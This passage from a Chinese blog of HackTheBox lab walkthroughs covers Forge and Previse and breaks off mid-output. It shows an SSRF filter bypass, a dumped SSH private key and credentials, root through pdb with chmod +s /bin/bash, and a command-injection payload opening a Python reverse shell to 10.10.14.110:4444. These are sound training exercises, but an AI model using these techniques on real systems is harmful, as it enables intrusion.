address (1 host up) scanned in 71.65 seconds\n```\n这边只开了`22`和`80`端口，咱们去看看`80`端口的http服务内容\n\n![](Hackthebox-Forge/image3.png)\n\n访问后直接被跳转到了`forge.htb`域名，这里咱们加一个域名解析\n\n```Plain Text\necho 10.10.11.111 forge.htb >> /etc/hosts\n```\n然后再访问一次\n\n![](Hackthebox-Forge/image4.png)\n\n这里有个上传功能，去试一下是否可以上传\n\n![](Hackthebox-Forge/image5.png)\n\n上传后会被去掉后缀？还是怎么着不太明白，反正没有解析，找一下其他思路吧\n\n主页上没有什么可看的东西了，爆一下目录和子域名吧\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 200 -u http://forge.htb/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://forge.htb/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/09/26 22:14:58 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]\nhttp://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]\nhttp://forge.htb/upload               (Status: 200) [Size: 929]\nhttp://forge.htb/server-status        (Status: 403) [Size: 274]\n===============================================================\n2021/09/26 22:29:14 Finished\n===============================================================\n```\n这里目录没爆出什么有用的东西，再去扫描DNS看看\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -t 50 -u forge.htb\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:          http://forge.htb\n[+] Method:       GET\n[+] Threads:      50\n[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:   gobuster/3.1.0\n[+] Timeout:      10s\n===============================================================\n2021/09/26 22:48:35 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: admin.forge.htb (Status: 200) [Size: 27]\n===============================================================\n2021/09/26 22:50:16 Finished\n===============================================================\n```\n找到了一个`admin`子域名，添加到`hosts`后再去试试\n\n```Plain Text\necho 10.10.11.111 admin.forge.htb >> /etc/hosts\n```\n![](Hackthebox-Forge/image6.png)\n\n访问后提示只允许本地主机，得想办法绕过一下\n\n## 漏洞利用\n整理一下目前的信息\n\n1. `forge.htb`为一个上传点\n2. `admin.forge.htb`只允许本地访问\n\n咱们咱们抓一下上传点的包看看内容\n\n![](Hackthebox-Forge/image7.png)\n\n看到后面才发现这个页面还有一个`Upload from url`的功能，疏忽了。\n\n抓个包看看\n\n![](Hackthebox-Forge/image8.png)\n\n这边随便输入点东西以后，显示支持`http`和`https`协议，再结合我们之前的`admin.forge.htb`来看，这不就是一个妥妥的SSRF？\n\n![](Hackthebox-Forge/image9.png)\n\n这样利用后，显示该URL被列入了黑名单，需要想办法绕过一下\n\n![](Hackthebox-Forge/image10.png)\n\n尝试性使用大小写绕过方式轻轻松松绕过，返回了一个URL，打开看看\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://forge.htb/uploads/2Y6eGsD37WCBc1m3pSJO\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Admin Portal</title>\n</head>\n<body>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\">\n    <header>\n            <nav>\n                <h1 class=\"\"><a href=\"/\">Portal home</a></h1>\n                <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1>\n                <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1>\n            </nav>\n    </header>\n    <br><br><br><br>\n    <br><br><br><br>\n    <center><h1>Welcome Admins!</h1></center>\n</body>\n</html>\n```\n成功读取到内容，给了一个`/announcements`目录\n\n让我们拿去再去读取一下，返回了域名，接着访问\n\n```Plain Text\nhttp://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY\n```\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Announcements</title>\n</head>\n<body>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\">\n    <header>\n            <nav>\n                <h1 class=\"\"><a href=\"/\">Portal home</a></h1>\n                <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1>\n                <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1>\n            </nav>\n    </header>\n    <br><br><br>\n    <ul>\n        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>\n        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>\n        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>.</li>\n    </ul>\n</body>\n</html>\n```\n```Plain Text\n我们得到了一个FTP账号密码\nusername = user\npassword = heightofsecurity123!\n```\n这边提示ftp不能被外部登录，但upload接口可以使用`?u=`参数指定ftp url\n\n```Plain Text\nurl=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&remote=1\n```\n继续调用\n\n```Plain Text\nhttp://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz\n```\n继续访问，这个步骤重复性好高啊\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz                                                                                                                                                          1 ⚙\ndrwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap\n-rw-r-----    1 0        1000           33 Sep 24 18:02 user.txt\n```\n这样获取好麻烦，又不想（hui）写脚本，试试看有没有私钥吧\n\n```Plain Text\nurl=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&remote=1\n```\n```Plain Text\nhttp://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1\n```\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\nshlLupso7WoS0AAAAKdXNlckBmb3JnZQE=\n-----END OPENSSH PRIVATE KEY-----\n```\n成功拿到私钥，保存到本地后使用私钥进行登录\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# chmod 600 id_rsa                                                                                                                                                                                            1 ⚙\n\n┌──(root💀kali)-[~/Desktop]\n└─# ssh user@10.10.11.111 -i id_rsa                                                                                                                                                                             1 ⚙\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 27 Sep 2021 03:26:19 AM UTC\n\n  System load:  0.0               Processes:             220\n  Usage of /:   45.0% of 6.82GB   Users logged in:       0\n  Memory usage: 30%               IPv4 address for eth0: 10.10.11.111\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Sep 26 21:31:23 2021 from 10.10.14.120\n-bash-5.0$ whoami&&id\nuser\nuid=1000(user) gid=1000(user) groups=1000(user)\n```\n登入成功\n\n```Plain Text\n-bash-5.0$ ls\nsnap  user.txt\n-bash-5.0$ cat user.txt\n7e72b4a44d946d578baa60ad23b0482f\n```\n成功拿到user权限的flag文件\n\n## 权限提升\n首先查看一下sudo -l\n\n```Plain Text\n-bash-5.0$ sudo -l\nMatching Defaults entries for user on forge:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser user may run the following commands on forge:\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py\n```\n这里的意思是`/usr/bin/python3`可以使用root权限执行`/opt/remote-manage.py`脚本\n\n咱们去看一下这个脚本\n\n```Plain Text\n-bash-5.0$ cat /opt/remote-manage.py\n#!/usr/bin/env python3\nimport socket\nimport random\nimport subprocess\nimport pdb\n\nport = random.randint(1025, 65535)\n\ntry:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind(('127.0.0.1', port))\n    sock.listen(1)\n    print(f'Listening on localhost:{port}')\n    (clientsock, addr) = sock.accept()\n    clientsock.send(b'Enter the secret passsword: ')\n    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':\n        clientsock.send(b'Wrong password!\\n')\n    else:\n        clientsock.send(b'Welcome admin!\\n')\n        while True:\n            clientsock.send(b'\\nWhat do you wanna do: \\n')\n            clientsock.send(b'[1] View processes\\n')\n            clientsock.send(b'[2] View free memory\\n')\n            clientsock.send(b'[3] View listening sockets\\n')\n            clientsock.send(b'[4] Quit\\n')\n            option = int(clientsock.recv(1024).strip())\n            if option == 1:\n                clientsock.send(subprocess.getoutput('ps aux').encode())\n            elif option == 2:\n                clientsock.send(subprocess.getoutput('df').encode())\n            elif option == 3:\n                clientsock.send(subprocess.getoutput('ss -lnt').encode())\n            elif option == 4:\n                clientsock.send(b'Bye\\n')\n                break\nexcept Exception as e:\n    print(e)\n    pdb.post_mortem(e.__traceback__)\nfinally:\n    quit()\n```\n这个脚本的意思是运行脚本后会开启一个端口，连接着一个端口输入选项，异常状态时会进入pdb，从而导致执行任意python代码\n\n那么原理有了，说干就干\n\n那么我们需要打开两个窗口，一个用于执行脚本，一个用于连接端口\n\n### Server\n```Plain Text\n-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py\nListening on localhost:34260\n```\n### Client\n```Plain Text\n-bash-5.0$ nc localhost 34260\nEnter the secret passsword: secretadminpassword\nWelcome admin!\n\nWhat do you wanna do:\n[1] View processes\n[2] View free memory\n[3] View listening sockets\n[4] Quit\n'\n```\n密码在脚本中，登录后输入一个顿号即可报错\n\n### 提权后操作\n```Plain Text\n-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py\nListening on localhost:34260\ninvalid literal for int() with base 10: b\"'\"\n> /opt/remote-manage.py(27)<module>()\n-> option = int(clientsock.recv(1024).strip())\n(Pdb) import os\n(Pdb) os.system(\"ls /root\")\nclean-uploads.sh  root.txt  snap\n0\n(Pdb) os.system(\"chmod +s /bin/bash\")\n0\n(Pdb) exit()\n-bash-5.0$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash\n-bash-5.0$ /bin/bash -p\nbash-5.0# whomai&&id\nbash: whomai: command not found\nbash-5.0# whoami&&id\nroot\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)\nbash-5.0# cd /root\nbash-5.0# ls\nclean-uploads.sh  root.txt  snap\nbash-5.0# cat root.txt\n67a501971344b12bade28d6a75e98cbd\n```\n报错后，使用python导入os.system模块，然后即可执行system权限\n\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Validation - Hackthebox","url":"/2021/09/27/Hackthebox/Easy/Hackthebox-Validation/","content":"\n# Hackthebox - Validation\n## 靶场信息\n![](Hackthebox-Validation/image1.png)\n\n## 靶场类型\n![](Hackthebox-Validation/image2.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV 10.10.11.116\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 04:02 EDT\nNmap scan report for 10.10.11.116\nHost is up (0.35s latency).\nNot shown: 992 closed ports\nPORT     STATE    SERVICE       VERSION\n22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open     http          Apache httpd 2.4.48 ((Debian))\n|_http-server-header: Apache/2.4.48 (Debian)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n5000/tcp filtered upnp\n5001/tcp filtered commplex-link\n5002/tcp filtered rfe\n5003/tcp filtered filemaker\n5004/tcp filtered avt-profile-1\n8080/tcp open     http          nginx\n|_http-title: 502 Bad Gateway\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=9/23%OT=22%CT=1%CU=39467%PV=Y%DS=2%DC=T%G=Y%TM=614C34A\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O\nOS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   364.74 ms 10.10.14.1\n2   364.80 ms 10.10.11.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.02 seconds\n```","tags":["Hackthebox"]},{"title":"Previse - Hackthebox","url":"/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/","content":"\n# Hackthebox - Previse\n## 靶场信息\n![](Hackthebox-Previse/image1.png)\n\n## 靶场类型\n![](Hackthebox-Previse/image2.png)\n\n## 信息搜集\n使用nmap进行端口扫描\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.11.104\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:27 CST\nNmap scan report for 10.10.11.104\nHost is up (0.25s latency).\nNot shown: 65461 closed ports, 72 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)\n|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)\n|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-title: Previse Login\n|_Requested resource was login.php\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=8/8%OT=22%CT=1%CU=38368%PV=Y%DS=2%DC=T%G=Y%TM=610FF0E8\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   249.39 ms 10.10.14.1\n2   249.51 ms 10.10.11.104\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1810.62 seconds\n```\n咱们进80端口看一下HTTP服务的内容\n\n![](Hackthebox-Previse/image3.png)\n\n这是一个文件管理服务器，我测试了一下简单的弱口令无果，咱们先fuzz一下吧\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -e php,html,txt -mc 200,302,301 -u http://10.10.11.104/FUZZ\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.104/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt\n :: Extensions       : php html txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 100\n :: Matcher          : Response status: 200,302,301\n________________________________________________\n\nlogin.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]\nindex.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]\nindex.html              [Status: 200, Size: 663, Words: 24, Lines: 23]\ndownload.php            [Status: 302, Size: 0, Words: 1, Lines: 1]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1]\nfooter.php              [Status: 200, Size: 217, Words: 10, Lines: 6]\nheader.php              [Status: 200, Size: 980, Words: 183, Lines: 21]\nfavicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\n.                       [Status: 302, Size: 2801, Words: 737, Lines: 72]\nstatus.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]\nnav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]\nindex.html              [Status: 200, Size: 663, Words: 24, Lines: 23]\nindex.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]\naccounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]\nfiles.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]\nlogin.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]\nfiles.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]\n:: Progress: [148168/148168] :: Job [1/1] :: 391 req/sec :: Duration: [0:06:55] :: Errors: 4 ::\n```\n直接访问了部分页面，都会跳转到`index.php`页面，使用curl访问试试\n\n```Plain Text\ncurl http://10.10.11.104/files.php\n\n<td><a href='download.php?file=32'><button class=\"uk-button uk-button-text\">siteBackup.zip</button></a></td>\n```\n这样看来，我们可以通过一些特殊的技巧来访问部分页面\n\n访问\n\n```Plain Text\n/accounts.php\n```\n会跳转到\n\n```Plain Text\n/index.php\n```\n，这里我们使用burp抓包\n\n![](Hackthebox-Previse/image4.png)\n\n![](Hackthebox-Previse/image5.png)\n\n抓包后点击 Do interrcept > Response to this request 来进行更改状态码\n\n![](Hackthebox-Previse/image6.png)\n\n将框选起来的部分修改为\n\n```Plain Text\nHTTP/1.1 200\n```\n然后放包\n\n![](Hackthebox-Previse/image7.png)\n\n成功进入添加新用户的页面\n\n添加一个新用户\n\n创建好以后，会自动跳转到\n\n```Plain Text\nindex.php\n```\n页面，然后去登录\n\n![](Hackthebox-Previse/image8.png)\n\n登入后在\n\n```Plain Text\nFILES\n```\n页面下有一个上传点和一个文件\n\n```Plain Text\nSITEBACKUP.ZIP\n```\n，先下载下来看看 ### config.php\n\n```Plain Text\n<?php\n\nfunction connectDB(){\n    $host = 'localhost';\n    $user = 'root';\n    $passwd = 'mySQL_p@ssw0rd!:)';\n    $db = 'previse';\n    $mycon = new mysqli($host, $user, $passwd, $db);\n    return $mycon;\n}\n\n?>\n```\n得到了mysql的账号密码 ### logs.php\n\n```Plain Text\n<?php\nsession_start();\nif (!isset($_SESSION['user'])) {\n    header('Location: login.php');\n    exit;\n}\n?>\n\n<?php\nif (!$_SERVER['REQUEST_METHOD'] == 'POST') {\n    header('Location: login.php');\n    exit;\n}\n\n/////////////////////////////////////////////////////////////////////////////////////\n//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//\n/////////////////////////////////////////////////////////////////////////////////////\n\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");\necho $output;\n\n$filepath = \"/var/www/out.log\";\n$filename = \"out.log\";\n\nif(file_exists($filepath)) {\n    header('Content-Description: File Transfer');\n    header('Content-Type: application/octet-stream');\n    header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"');\n    header('Expires: 0');\n    header('Cache-Control: must-revalidate');\n    header('Pragma: public');\n    header('Content-Length: ' . filesize($filepath));\n    ob_clean(); // Discard data in the output buffer\n    flush(); // Flush system headers\n    readfile($filepath);\n    die();\n} else {\n    http_response_code(404);\n    die();\n}\n?>\n```\n从上述代码审计发现，这台靶机的程序使用了python进行编写，而不是PHP，从代码看起来，这很容易被命令注入 ## 漏洞利用\n\n![](Hackthebox-Previse/image9.png)\n\n点击 MANAGEMENT MENU > LOG DATA > SUBMIT使用burp抓包\n\n![](Hackthebox-Previse/image10.png)\n\n```Plain Text\ndelim=comma;python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect((\"10.10.14.110\",4444)) %3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn(\"/bin/bash\")'\n```\n使用nc监听端口，即可getshell\n\n```Plain Text\n(root💀root)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.104] 56380\nbash-4.4$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n登录mysql\n\n```Plain Text\nbash-4.4$ mysql -u root -p\nmysql -u root -p\nEnter password: mySQL_p@ssw0rd!:)\n\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| previse            |\n| sys                |\n+--------------------+\n\nuse previse;\nshow tables;\n+-------------------+\n| Tables_in_previse |\n+-------------------+\n| accounts          |\n| files             |\n+-------------------+\n\nselect * from accounts;\n+----+-----------+------------------------------------+---------------------+\n| id | username  | password                           | created_at          |\n+----+-----------+------------------------------------+---------------------+\n|  1 | m4lwhere  | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.   | 2021-05-27 18:18:36 |\n|  2 | robin     | $1$🧂llol$gBt8as2nJZA5K1YqzaH9Z/   | 2021-08-08 12:38:45 |\n|  4 | caratortu | $1$🧂llol$04L/OghOADV.ufho3gKfY. 